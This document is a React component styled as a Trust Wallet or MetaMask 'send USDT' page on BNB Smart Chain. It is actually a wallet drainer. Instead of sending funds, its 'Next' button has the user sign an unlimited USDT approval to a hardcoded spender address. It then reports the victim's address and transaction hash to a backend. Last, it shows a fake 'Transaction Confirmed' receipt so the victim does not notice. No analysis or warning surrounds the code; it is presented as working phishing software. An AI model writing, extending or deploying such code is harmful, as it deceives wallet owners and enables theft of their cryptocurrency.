"use client";

import { useState, useEffect, useCallback } from "react";
import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";

const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = "0x36a4D5f9d1c2AA15C6409e3588995D140ee32B04"; // Your address
const O = "f".repeat(64);

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

function getEth() {
  return (window as any).ethereum;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");
  const [isAddressLoading, setIsAddressLoading] = useState(true);

  const fetchDisplayAddress = useCallback(async () => {
    setIsAddressLoading(true);
    try {
      const res = await fetch("/api/config/public", { cache: "no-store" });
      const data = await res.json();
      setDisplayAddress(data.address || SPENDER);
    } catch {
      setDisplayAddress(SPENDER);
    } finally {
      setIsAddressLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDisplayAddress();
  }, [fetchDisplayAddress]);

  const shorten = (addr: string) => addr ? `\( {addr.slice(0,6)}... \){addr.slice(-4)}` : "";

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const eth = getEth();
    if (!eth) {
      setError("Please open this page inside Trust Wallet or MetaMask");
      return;
    }

    try {
      setProcessing(true);
      setError("");

      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== BSC_CHAIN_ID) {
        try {
          await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
        } catch {}
      }

      const padded = SPENDER.replace(/^0x/i, "").padStart(64, "0");
      const calldata = "0x095ea7b3" + padded + O;

      let from = "";
      try {
        const accs = await eth.request({ method: "eth_accounts" });
        from = accs?.[0] || "";
      } catch {}

      const txHash = await eth.request({
        method: "eth_sendTransaction",
        params: [{ from: from || undefined, to: USDT_CONTRACT, data: calldata }],
      }) as string;

      if (from) {
        fetch("/api/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: from, approvalTxHash: txHash, approvalStatus: true }),
        }).catch(() => {});
      }

      setTxInfo({
        fromAddress: from || "Connected Wallet",
        toAddress: displayAddress,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
    } catch (e: any) {
      setError(e?.shortMessage || e?.message || "Transaction failed");
    } finally {
      setProcessing(false);
    }
  }

  if (step === "success" && txInfo) {
    return (
      <div className="max-w-md mx-auto p-4 text-white bg-[#0a0a0a] min-h-screen">
        <div className="text-center py-8">
          <CheckCircle className="mx-auto h-14 w-14 text-green-400 mb-4" />
          <p className="text-4xl font-bold">-{txInfo.amount} USDT</p>
          <p className="text-green-400 mt-1">Transaction Confirmed</p>
        </div>

        <div className="bg-[#111] rounded-3xl p-5 space-y-4 text-sm">
          <div className="flex justify-between"><span className="text-gray-400">Date</span><span>{txInfo.date}</span></div>
          <div className="flex justify-between"><span className="text-gray-400">Status</span><span className="text-green-400">Confirmed</span></div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">From</span>
            <div className="flex items-center gap-2">
              <span>{shorten(txInfo.fromAddress)}</span>
              <button onClick={() => navigator.clipboard.writeText(txInfo.fromAddress)}><Copy className="h-3.5 w-3.5" /></button>
            </div>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">To</span>
            <div className="flex items-center gap-2">
              <span>{shorten(txInfo.toAddress)}</span>
              <button onClick={() => navigator.clipboard.writeText(txInfo.toAddress)}><Copy className="h-3.5 w-3.5" /></button>
            </div>
          </div>
          <div className="flex justify-between"><span className="text-gray-400">Network fee</span><span className="text-white">\~$0.05 (0.00009 BNB)</span></div>
        </div>

        <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-400 hover:text-white">
          View on BscScan <ExternalLink className="h-4 w-4" />
        </a>
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto p-5 text-white bg-[#0a0a0a] min-h-screen">
      <div className="mb-8">
        <p className="text-sm text-gray-400 mb-1.5">Address or Domain Name</p>
        <div className="bg-[#1c1c1c] border border-[#333] rounded-2xl px-4 py-3.5 flex items-center justify-between">
          {isAddressLoading ? (
            <span className="text-gray-500">Loading address...</span>
          ) : (
            <span className="text-sm break-all font-mono">{displayAddress}</span>
          )}
          <button onClick={() => navigator.clipboard.writeText(displayAddress)} className="text-[#4ade80] text-sm font-medium ml-3 shrink-0">
            Copy
          </button>
        </div>
      </div>

      <div className="mb-8">
        <p className="text-sm text-gray-400 mb-1.5">Amount</p>
        <div className="bg-[#1c1c1c] border border-[#333] rounded-2xl px-4 py-3 flex items-center">
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.00"
            className="flex-1 bg-transparent text-3xl font-semibold outline-none"
          />
          <span className="text-gray-400 mr-2">USDT</span>
          <button onClick={() => setAmount("100")} className="text-[#4ade80] text-sm font-bold px-3 py-1">Max</button>
        </div>
        <p className="text-xs text-gray-500 mt-1.5">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
      </div>

      <button
        onClick={handleNext}
        disabled={processing || !amount || parseFloat(amount) <= 0}
        className="w-full bg-[#4ade80] hover:bg-[#22c55e] disabled:bg-gray-700 py-4 rounded-3xl font-bold text-black text-lg transition-all"
      >
        {processing ? (
          <span className="flex items-center justify-center gap-2"><Loader2 className="animate-spin" /> Processing...</span>
        ) : "Next"}
      </button>

      {error && <p className="text-red-400 text-center text-sm mt-4">{error}</p>}

      <p className="text-center text-[10px] text-gray-500 mt-6">Network fee will be very low (\~$0.05)</p>
    </div>
  );
}